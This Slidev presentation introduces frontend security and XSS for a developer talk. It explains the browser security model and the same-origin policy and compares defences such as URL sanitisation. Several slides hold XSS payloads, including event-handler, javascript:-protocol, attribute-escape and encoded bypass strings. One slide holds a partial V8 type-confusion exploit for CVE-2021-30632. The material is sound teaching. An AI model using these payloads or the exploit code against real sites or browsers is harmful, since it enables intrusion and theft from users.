---
# You can also start simply with 'default'
theme: seriph
# random image from a curated Unsplash collection by Anthony
# like them? see https://unsplash.com/collections/94734566/slidev
background: https://cover.sli.dev
# some information about your slides (markdown enabled)
title: "Frontend Security: An Introduction to XSS"
info: |
  ## Frontend Security: An Introduction to XSS
  - speaker：Monica
  - date：2024.10.29
  - presentation at: Langlive Tech Sharing

author: Monica
# apply unocss classes to the current slide
class: text-center
highlighter: shiki
lineNumbers: true
# https://sli.dev/features/drawing
drawings:
  persist: false
# slide transition: https://sli.dev/guide/animations.html#slide-transitions
transition: slide-left
# enable MDC Syntax: https://sli.dev/features/mdc
mdc: true
# take snapshot for each slide in the overview
overviewSnapshots: true
fonts:
  # basically the text
  sans: Robot Noto Sans
  # use with `font-serif` css class from UnoCSS
  serif: Robot Noto Serif
  # for code blocks, inline code, etc.
  mono: Fira Code
---

# Frontend Security: An Introduction to XSS

## aka 《Beyond XSS：探索網頁前端資安宇宙》 Ch1 Reading Notes

<div class="mt-6">
<p>speaker：Monica</p>
<p>2024.10.29 @Langlive Tech Sharing</p>
</div>

<!--
The last comment block of each slide will be treated as slide notes. It will be visible and editable in Presenter Mode along with the slide. [Read more in the docs](https://sli.dev/guide/syntax.html#notes)
-->

<style>
  h2{
    @apply text-light-700;
  }
  .slidev-layout p{
    margin-top: 0px;
    margin-bottom: 0.5rem;
    opacity: 0.6;
  }
</style>

---

# Why Frontend Security Matters?

Conversely, what problems can security vulnerabilities cause?

- Data Leaks
- Financial Losses
- Damage to Company Reputation
  <br/>
  <br/>
- Vulnerability cases
  - [ZD-2022-00425 雲端租屋生活網 弱密碼](https://zeroday.hitcon.org/vulnerability/ZD-2022-00425)
  - [ZD-2022-00416 康軒電子書 FTP帳密洩漏](https://zeroday.hitcon.org/vulnerability/ZD-2022-00416)
  - [ZD-2022-00323 弘爺漢堡 個資易讀取](https://zeroday.hitcon.org/vulnerability/ZD-2022-00323)

---

```yaml
layout: image-right
image: /image/front-end-security-universe.png
```

# Front-end Security Universe

- XSS is the largest "planet" in the front-end security universe, but there are many other security issues as well
  - e.g. prototype pollution、CSS injection、XSLeaks
- From a security standpoint, HTML, CSS, and JavaScript can be used in unexpected ways

<!--
如果把網頁前端資安的領域比喻成一個宇宙的話，XSS 或許就是那顆最大最亮的星球，佔據了多數人的目光。但除了它以外，在宇宙中還有很多沒這麼大的行星與恆星，它一直都在那，你只是沒發現而已。
除了 XSS 以外，還有很多值得學習的資安議題，例如說利用 JavaScript 特性的 prototype pollution、根本不需要 JavaScript 就能執行的 CSS injection 攻擊，或是網頁前端的旁路攻擊 XSLeaks 等等。
-->

---

# Browser Security Model

- Web frontend programs run in the browser
  - Browser is responsible for rendering HTML, parsing CSS, and executing JavaScript
- Operating System → Application (Browser) → Web Frontend JavaScript
  - The deeper the layer, the stricter the restrictions
    <img src="/image/frontend-js-in-browser.png" class="h-40" />
- Some tasks can't be done in the frontend simply because the browser doesn't allow them

<br />

> If the browser doesn’t give it to you, you can’t get it.

---

# Browser Security Restrictions: No "Active" Access to Local Files

- Backend: Programs run on the operating system and can do almost anything (unless specifically restricted)
- Frontend:
  - Cannot "actively" read or write files on the local machine
  - Can "passively" read files

<div class="ml-6">
```js
// ⛔ cannot "actively" read or write files
fetch("file:///data/index.html");
window.open("file:///data/index.html");
```
</div>

<div class="ml-6">

```html {*}{maxHeight:'60px'}
<!-- ✅ can passively let users select a file via input, then use FileReader to read its contents -->
<input type="file" onchange="show(this)" />

<script>
  function show(input) {
    const reader = new FileReader();
    reader.onload = (event) => {
      alert(event.target.result);
    };
    reader.readAsText(input.files[0]);
  }
</script>
```

</div>

- If the browser could actively read and write files, it would...?
- Vulnerability case: [Bug Bounty Guest Post: Local File Read via Stored XSS in The Opera Browser](https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/)
  - The note page "opera:pinboards" uses a special protocol, which can open `file://` pages

---

# Browser Security Restrictions: Prohibit Calling System APIs

- The frontend can use APIs provided by the browser
  - ✅ `fetch` to make requests
  - ✅ [Web Bluetooth API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Bluetooth_API) for Bluetooth applications
  - ✅ [MediaDevices](https://developer.mozilla.org/zh-CN/docs/Web/API/MediaDevices) to access microphones and cameras (requires user permission)
- The frontend cannot use system APIs not provided by the browser
  - The frontend cannot modify system or network settings
  - It’s not that JavaScript can’t do it — JavaScript is just a language; it's the browser execution environment that doesn't provide these APIs

---

# Browser Security Restrictions: Prohibition of Accessing Content from Other Web Pages

> A webpage should never have access to the content of other webpages.

- Same-Origin Policy ([SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)): Each webpage only has permissions for its own resources
  - It can modify its own HTML and execute its own JavaScript
  - It should not access data from other webpages, including URLs

<div class='ml-6'>

```js
// What happens if you run this in GitHub.com's console?
var win = window.open("https://www.goplayone.com/");
setTimeout(() => {
  console.log(win.location.href);
}, 3000);
```

</div>

- Vulnerability case: Meltdown and Spectre, revealed by Google's Project Zero
  - Issue: CPU flaws allowed data access within the same process
  - Solution: Chrome now isolates each webpage into separate processes, no matter how they are loaded (e.g. images, iframes) → [Site Isolation](https://www.chromium.org/Home/chromium-security/site-isolation/)

---

# Browser Security Restrictions: Prohibition of Accessing Content from Other Web Pages

- Vulnerability case：[Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://issues.chromium.org/issues/40060755)
  - Issue: An `iframe` can be used to read the URL of a cross-origin page
    - Current URL is `a.example.com`, iframe URL is `b.example.com`
    - Redirecting `frames[0].location = 'about:blank'` makes the iframe same-origin with `a.example.com`
    - Using `frames[0].navigation.entries()`, the `b.example.com` URL can be accessed
    - 🔺 The iframe’s history should be cleared after redirection

---

# Browser Security Restrictions: Prohibition of Accessing Content from Other Web Pages

- Vulnerability case：[Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://issues.chromium.org/issues/40060755)
  - Why is reading the URL a problem?
    <img src="/image/problem-of-reading-iframe-url.png" class="h-60" />

---

# Critical Vulnerability: RCE

- Remote Code Execution (RCE)
  - Attackers can exploit browser flaws to run arbitrary commands via JavaScript
  - e.g. after visiting [blog](https://blog.huli.tw/), the site's JavaScript uses an RCE bug to control your computer
- Vulnerability case: CVE-2021-30632
  - Issue: Opening a webpage in Chrome (pre-v93) let attackers run commands on your computer
  - Vulnerability mechanism: It exploited a bug in the JavaScript V8 engine, which boosts performance by compiling frequently used code for faster execution

<div class='ml-12'>

```js {*}{maxHeight:'100px'}
// This function is optimized (compiled), think of it in terms of assembly language
function oobRead() {
  return x[20];
}
// If x is a double array, each double takes 8 bytes, so oobRead will always access the memory at x + 20*8 (which is x + 160)
// If x is an int array with a length of 30, the total length is 4*30 = 120, meaning x + 160 exceeds the bounds and reads memory it shouldn't -> OOB read (Out-Of-Bounds read)
```

</div>

<div class='note-block'>
<!-- 💡 V8 引擎運作可參考<a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">這篇文章</a>，V8 引擎編譯 JavaScript 時採 Just-In-Time（JIT）方式，JIT 結合解釋和編譯，執行 JavaScript 時，能分析程式碼執行過程的情報，並在取得足夠情報時，將相關程式碼再編譯成效能更快的機器碼。 -->
💡 V8 uses Just-In-Time (JIT) compilation. It analyzes code execution, gathers runtime data, and recompiles frequently used parts into optimized machine code. (<a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">ref</a>) 
</div>

<!--
V8 引擎會做些改善效能的事，舉例來說，add 函式總是接收兩參數，參數總是正整數，V8 可能將函式編譯成 machine code；當參數不符假設時再退回以前執行方式
💡 V8 引擎運作可參考<a href="https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe" target="_blank">這篇文章</a>，V8 引擎編譯 JavaScript 時採 Just-In-Time（JIT）方式，JIT 結合解釋和編譯，執行 JavaScript 時，能分析程式碼執行過程的情報，並在取得足夠情報時，將相關程式碼再編譯成效能更快的機器碼。
-->

---

# Critical Vulnerability: RCE

- Vulnerability case: CVE-2021-30632
  - How is this vulnerability exploited?（[detailed article](https://medium.com/r?url=https%3A%2F%2Fsecuritylab.github.com%2Fresearch%2Fin_the_wild_chrome_cve_2021_30632%2F)）
    - Trick V8 into thinking `x` is always a `double` array, compiling it to read from a fixed location `x + 160`, but `x` is actually an `int` array with less memory
      - → Type Confusion, allowing out-of-bounds memory read/write
    - Use [WebAssembly](https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts) to overwrite compiled code and replace it with arbitrary code → Arbitrary Code Execution
  - Vulnerability code [link](https://github.com/CrackerCat/CVE-2021-30632/blob/main/CVE-2021-30632.html)

<div class='ml-12'>

```js{*}{maxHeight:'180px'}
// Function used to trigger garbage collection
function gc() {
  for(var i = 0;i < ((1024*1024)); i++) {
    new String();
  }
}

function foo(y) {
x = y;
}

function oobRead() {
//addrOf b[0] and addrOf writeArr::elements
return [x[20],x[24]];
}

function oobWrite(addr) {
x[24] = addr;
}

// Preparations to trigger the bug
var arr0 = new Array(10); arr0.fill(1);arr0.a = 1;
var arr1 = new Array(10); arr1.fill(2);arr1.a = 1;
var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;
var x = arr0;

gc();gc();

var arr = new Array(30); arr.fill(4); arr.a = 1;
var b = new Array(1); b.fill(1);
var writeArr = [1.1];

// Optimize foo in V8
for (let i = 0; i < 19321; i++) {
if (i == 19319) arr2[0] = 1.1;
foo(arr1);
}

x[0] = 1.1;

// Optimize oobRead function in V8
// At this point, V8 assumes that x in oobRead is always of type double
for (let i = 0; i < 20000; i++) {
oobRead();
}

// Optimize oobWrite function in V8
for (let i = 0; i < 20000; i++) oobWrite(1.1);

// Exploit the bug, making x an int array, but V8 still assumes x is double
foo(arr);

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);
b[0] = instance;

// Read from out-of-bounds memory location
var addrs = oobRead();

```

</div>

---

# What is XSS?

- Full name: Cross-site scripting (XSS)
- XSS allows attackers to execute JavaScript on other people's websites
- Example
  - Visit `index.php?name=monica`, the page shows: "Hello, monica"
  - Visit `index.php?name=<script>alert(1)</script>`, the page becomes: `Hello, <script>alert(1)</script>`
    - The `<script>` tag is executed as JavaScript, triggering an alert popup

<div class='ml-12'>

```php
<?php
 echo "Hello, " . $_GET['name'];
?>
```

</div>

---

# What happens if XSS is achieved?

- With XSS, attackers can...

  - Steal `localStorage` data
  - Access cookies via `document.cookie` if HttpOnly is not set
  - If cookies can't be stolen, use `fetch()` to make API requests as the victim

（Having the token affects the scope and duration of the attack）

- XSS Prevention Example: require current or secondary passwords when changing sensitive information

---

# Sources of XSS

- Why XSS happens?
  - User input is directly displayed on the page, allowing attackers to inject malicious JavaScript

Viewing XSS:

#### 1. How the content is placed on the page

- From the backend: like the PHP example, the attacker's input is directly output by the backend
  - The XSS payload is already in the HTML when the browser receives it
- From the frontend
<div class='ml-6'>

```html {*}{maxHeight:'120px'}
<div>Hello, <span id="name"></span></div>
<script>
  const qs = new URLSearchParams(window.location.search);
  const name = qs.get("name");
  document.querySelector("#name").innerHTML = name;
</script>
<!-- You can inject content via index.html?name=<script>alert(1)</script>
Output content from the frontend, innerHTML adds the payload to the page.

💡 Note: <script> injected via innerHTML won't execute. -->
```

</div>

---

# Sources of XSS

<br class='hidden'/>
Viewing XSS:

#### 2. Whether the payload is stored

- Payload not stored
  - e.g. displaying query string content directly on the page
    - Attack method: Clicking a link with XSS
    - Target: The person who clicks the link
- Payload stored
  - e.g. inserting HTML with `<script>` in a comment or post
    - Attack method: Posting a comment with `<script>`
    - Target: Anyone who views the comment/post
    - → Can become wormable, spreading the attack further

---

# Other XSS Types

- Self-XSS
  - attacking oneself
    - e.g. pasting JavaScript into the browser's developer tools
  - XSS that can only attack oneself
    - e.g. XSS in a personal info input field (e.g. phone number)
      - Only you see the `alert()` (but others might see it if combined with other vulnerabilities)
- Blind XSS
  - XSS is executed in places you can't see or at unknown times
    - e.g. no XSS in an e-commerce platform's fields, but the admin order dashboard has an XSS vulnerability via the name field
  - Test by making the payload send a request
  - Vulnerability case: [Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929)

---

# Ways to Execute JavaScript

Once you control the HTML, how can you execute JavaScript?

#### `<script>` tag

- Easily detected by [WAF(Web Application Firewall)](https://zh.wikipedia.org/zh-tw/%E7%B6%B2%E9%A0%81%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E9%98%B2%E7%81%AB%E7%89%86)
- Doesn't work in `innerHTML` context
  - 🔺 `innerHTML` combined with iframe can execute scripts

<div class='ml-6'>

```html
<!-- The iframe's srcdoc attribute can contain full HTML to define its content.
This iframe is same-origin with the current page.
A <script> placed in the srcdoc attribute will execute. -->

document.body.innerHTML = `<iframe
  srcdoc="&lt;script>alert(1)&lt;/script>"
></iframe
>`
```

</div>

<div class='text-size-sm mt-12'>
More payloads: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">Cross-site scripting (XSS) cheat sheet</a>
</div>

---

# Ways to Execute JavaScript

Once you control the HTML, how can you execute JavaScript?

#### Event handlers in attributes (starting with `on`)

- `onerror`
- `onload`
- `onfocus`
- `onblur`
- `onanimationend`
- `onclick`
- `onmouseenter`

```html
<img src="not_exist" onerror="alert(1)" />
<button onclick="alert(1)">click me</button>
<svg onload="alert(1)"></svg>
```

---

# Ways to Execute JavaScript

Once you control the HTML, how can you execute JavaScript?

#### `javascript:` pseudo-protocol

```html
<a href="javascript:alert(1)">Link</a>
```

<div class='note-block mt-12'>
💡 How to make an <code>a</code> link unresponsive when clicked
```html
<a href=javascript:void(0)>Link</a>
```
</div>

<div class='note-block'>
💡 HTML shorthand
<br />
- Double quotes <code>"</code> around HTML attributes are optional if there are no spaces
<br />
- Spaces between HTML tags and attributes can be replaced with <code>/</code>
```html
<svg/onload=alert(1)>
```
</div>

---

# XSS in Different Scenarios and Defense Mechanisms

- Injection point: the place where payload can be injected
  - Different injection points impact attack methods and defenses

#### HTML Injection

- Example
  - Can directly insert any desired element

<div class='ml-6'>

```php
<?php
 echo "Hello, <h1>" . $_GET['name'] . '</h1>';
?>
```

```html {*}{maxHeight:'80px'}
<div>Hello, <span id="name"></span></div>
<script>
  const qs = new URLSearchParams(window.location.search);
  const name = qs.get("name");
  document.querySelector("#name").innerHTML = name;
</script>
```

</div>

- Defense method: Encode `<` and `>`

---

# XSS in Different Scenarios and Defense Mechanisms

#### Attribute Injection

- Example（[demo](https://cdpn.io/pen/debug/qBejjaq?authentication_hash=PBrNWpNGYgNA)）
  - Escape the attribute, close the tag, add a new one: `"><img src=not_exist onerror=alert(1)>`
  - Escape the attribute, add an event handler: `" tabindex=1 onfocus="alert(1)" x="`

<div class='ml-6'>
```html {*}{maxHeight:'60px'}
<div id="content"></div>
<script>
  const qs = new URLSearchParams(window.location.search)
  const clazz = qs.get('clazz')
  document.querySelector('#content').innerHTML = `
    <div class="${clazz}">
      Demo
    </div>
  `
</script>
```
</div>

- Defense methods
  - Encode `<>"'`
  - Avoid writing attributes without quotes
    - Even with `<>"'` encoded, unquoted attributes can still be exploited using spaces（[demo](https://codepen.io/qpozkvnr-the-selector/pen/bGXRRaz)）

<div class='ml-6'>
```js {3}{maxHeight:'60px'}
// ⛔ Don't write it this way
document.querySelector('#content').innerHTML = `
  <div class=${clazz}>
    Demo
  </div>`
```
</div>

---

# XSS in Different Scenarios and Defense Mechanisms

#### JavaScript Injection

- User input is reflected in JavaScript (input cannot contain line breaks)

<div class='ml-6'>
```html {*}{maxHeight:'100px'}
<!-- Add </script> in the name payload to close the tag early and insert other tags -->
<script>
  const name = "<?php echo $_GET['name'] ?>";
  alert(name);
</script>
```
</div>

- Use template strings to handle user input (input can include line breaks)

<div class='ml-6'>
```html {*}{maxHeight:'100px'}
<!-- Can inject ${alert(1)} in the name payload to launch an attack -->
<script>
  const name = `
    Hello,
    <?php echo $_GET['name'] ?>
  `;
  alert(name);
</script>
```
</div>

- Defense methods
  - Encode `<>"'`
  - Be cautious with template strings

---

# What is the javascript: pseudo protocol?

- Real protocols: `HTTP`、`TCP`、`FTP`
- Pseudo protocols: `mailto:`、`tel:`、`javascript:`
  - `javascript:` pseudo protocol can execute JavaScript
- Where can the `javascript:` pseudo protocol be used?
<div class='ml-6'>

```html
<!-- Triggered on click -->
<a href="javascript:alert(1)">Link</a>

<!-- Triggered on click -->
<form action="javascript:alert(1)">
  <button>submit</button>
</form>

<!-- Triggered on click -->
<form id="f2"></form>
<button form="f2" formaction="javascript:alert(2)">submit</button>

<!-- Triggered without any action -->
<iframe src="javascript:alert(1)"></iframe>
```

</div>

---

# The Dangers of javascript:

- Example: Embedding a YouTube video
<div class='ml-6'>

```html
<!-- Inserting javascript:alert(1) as the YouTube URL creates an XSS vulnerability -->
<iframe src="<?= $youtube_url ?>" width="500" height="300"></iframe>
```

</div>

- Example: Adding a blog link to a profile
  - Real case: [Hahow vulnerability](https://zeroday.hitcon.org/vulnerability/ZD-2020-00903)
- Frontend framework
  - ✅ Usually escapes characters properly
    - No issues if React’s `dangerouslySetInnerHTML` or Vue’s `v-html` are not used
  - 🔺 It doesn’t prevent `href`（[demo](https://codesandbox.io/p/sandbox/xss-demo-javascript-in-react-lr7zyt)）
    - React v16.9+ prints warnings for `javascript:` and may block it in the future, but it still executes for now（[ref](https://github.com/facebook/react/issues/16592)）

---

# The Dangers of javascript:

- Additional case: [Lexical](https://github.com/facebook/lexical) once had an [issue](https://github.com/facebook/lexical/issues/2806) where it didn’t defend against `javascript:` in links
  - Current: Uses `new URL` to verify the protocol（[ref](https://github.com/facebook/lexical/blob/790b5161d2f15e22bc5d7037a2e2f5fca5795af7/packages/lexical-link/src/index.ts#L175-L186)）

<div class='ml-6'>

```js {*}{maxHeight:'300px'}
const SUPPORTED_URL_PROTOCOLS = new Set([
  'http:',
  'https:',
  'mailto:',
  'sms:',
  'tel:',
]);

// ...
sanitizeUrl(url: string): string {
  try {
    const parsedUrl = new URL(url);
    // eslint-disable-next-line no-script-url
    if (!SUPPORTED_URL_PROTOCOLS.has(parsedUrl.protocol)) {
    return 'about:blank';
    }
  } catch {
    return url;
  }
    return url;
}

```

</div>

---

# Risks of Page Redirection

ref: [在做跳轉功能時應該注意的問題：Open Redirect](https://tech-blog.cymetrics.io/posts/huli/open-redirect/)

- Redirect after login

<div class='ml-6'>

```js
const searchParams = new URLSearchParams(location.search);
window.location = searchParams.get("redirect");

// Issue: window.location can also accept the javascript: pseudo-protocol
```

</div>

- Vulnerability case: Matters News
  - Attack method: A phishing email with a malicious link leads the user to a legitimate website. After logging in, XSS is used to steal credentials, then the user is redirected back to the homepage

<div class='ml-6'>

```js {*}{maxHeight:'150px'}
/**
 * Redirect to "?target=" or fallback URL with page reload.
 *
 * (works on CSR)
 */

// Call redirectToTarget after login
export const redirectToTarget = ({
fallback = 'current',
}: {
fallback?: 'homepage' | 'current'
} = {}) => {
  const fallbackTarget =
  fallback === 'homepage'
  ? `/` // FIXME: to purge cache
  : window.location.href
  const target = getTarget() || fallbackTarget

  window.location.href = decodeURIComponent(target)
}

// getTarget() gets the value from the query string, then redirects using window.location.href = decodeURIComponent(target)
// If the login URL is https://matters.news/login?target=javascript:alert(1), after logging in, it will trigger an alert

```

</div>

---

# Ways to Defend against javascript:

<br class='hidden'/>

💯 Recommend: Use libraries like [`sanitize-url`](https://github.com/braintree/sanitize-url) for protection

#### If you want to defend yourself...

- ⛔ Filter `javascript:` in the string

<div class='ml-6'>

```html
<!-- HTML attribute values can be encoded, and this can still be exploited -->
<a href="&#106avascript&colon;alert(1)">click me</a>
```

</div>

- ✅ Only allow strings starting with `http://` or `https://`
- ✅✅ Parse the URL using JavaScript
  - Validate the protocol to ensure it's safe

<div class='ml-6'>

```js {*}{maxHeight:'150px'}
console.log(new URL("javascript:alert(1)"));
/*
  {
    // ...
    href: "javascript:alert(1)",
    origin: "null",
    pathname: "alert(1)",
    protocol: "javascript:",
  }
*/
```

</div>

---

# Ways to Defend against javascript:

#### If you want to defend yourself...

- ✅ Use RegExp
  - Refer to React's implementation([ref](https://github.com/facebook/react/blob/v18.2.0/packages/react-dom/src/shared/sanitizeURL.js#L22))

<div class='ml-6'>

```js
const isJavaScriptProtocol =
  /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*\:/i;
```

</div>

- 🔺 Add `target="_blank"` to links, letting the browser handle them.
  - Browser behavior when clicking `javascript:` links
    - Chrome: Opens a new tab with `about:blank#blocked`
    - Firefox: Opens a new tab without a URL
    - Safari: Nothing happens
  - Remaining vulnerability: Clicking with the middle mouse button still executes JavaScript

---

# Vulnerability Case: javascript: Vulnerability in Telegram

ref: [История одной XSS в Telegram](https://habr.com/ru/articles/744316/)

- Background

<div class='ml-6'>

```js {*}{maxHeight:'80px'}
// Telegram Web A's ensureProtocol checks if the URL has ://, and if not, it automatically adds http://

export function ensureProtocol(url?: string) {
  if (!url) {
    return undefined;
  }
  return url.includes('://') ? url : `http://${url}`;
}

```

</div>

- Vulnerability Mechanism: URLs can include a username and password (HTTP Basic Authentication), separated by `:`
  - e.g. `javascript:alert@github.com/#://` can bypass the function and server checks
    - The server sees it as a valid URL, the browser sees it as JavaScript → 🔺 block failed

<div class='note-block'>
💡 HTTP Basic Authentication（ref: <a href="https://zh.wikipedia.org/zh-tw/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" target="_blank">HTTP基本認證</a>、<a href="https://carsonwah.github.io/http-authentication.html" target="_blank">開發者必備知識 - HTTP認證（HTTP Authentication）</a>）
</div>

---

# Vulnerability Case: javascript: Vulnerability in Telegram

ref: [История одной XSS в Telegram](https://habr.com/ru/articles/744316/)

- Attack implementation

<div class='ml-6'>

```js
// Use URL encoding to create a link that the server sees as valid but the browser treats as an XSS payload
javascript:alert%28%27Slonser%20was%20here%21%27%29%3B%2F%2F@github.com#;alert(10);://eow5kas78d0wlv0.m.pipedream.net%27

// after decoded
javascript:alert('Slonser was here!');//@github.com#;alert(10);://eow5kas78d0wlv0.m.pipedream.net'
```

</div>

- Fix: Use `new URL` to ensure the protocol is not `javascript:`

<div class='ml-6'>

```js {*}{maxHeight:'150px'}
export function ensureProtocol(url?: string) {
  if (!url) {
    return undefined;
  }

  // HTTP was chosen by default as a fix for https://bugs.telegram.org/c/10712.
  // It is also the default protocol in the official TDesktop client.
  try {
    const parsedUrl = new URL(url);
    // eslint-disable-next-line no-script-url
    if (parsedUrl.protocol === 'javascript:') {
      return `http://${url}`;
    }

    return url;
  } catch (err) {
    return `http://${url}`;
  }
}
```

</div>

---

# Summary

- Never trust user input
- Use third-party libraries to handle/defend against user input
- This is just a small part of frontend security, there's much more...
  - Multiple layers of XSS defense and bypass techniques
  - Attacks without JavaScript
  - Cross-site attacks
  - Other security topic

---

```yaml
layout: center
class: text-center
```

# Thanks for Listening!

# Q & A

---

# Reference

- 《Beyond XSS：探索網頁前端資安宇宙》 Chapter 1
- https://www.cloudthat.com/resources/blog/exploring-security-for-frontend-development
- https://blog.bitsrc.io/frontend-application-security-tips-practices-f9be12169e66
- https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe
